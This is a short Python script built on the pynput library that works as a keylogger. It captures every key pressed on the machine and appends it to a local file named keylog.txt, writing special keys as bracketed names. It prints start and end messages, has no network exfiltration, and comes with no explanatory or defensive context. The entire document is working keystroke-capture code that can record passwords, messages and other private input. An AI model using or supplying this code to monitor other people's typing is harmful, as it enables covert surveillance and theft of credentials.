from pynput import keyboard


print("Key Log Started.")

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as log:
            if hasattr(key, 'char'):  # Printable characters
                log.write(key.char)
            else:  # Special keys (e.g., space, enter)
                log.write(f"[{key.name}]")
    except Exception as e:
        print(f"Error: {e}")

# Set up the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


print("Key Log Ended.")
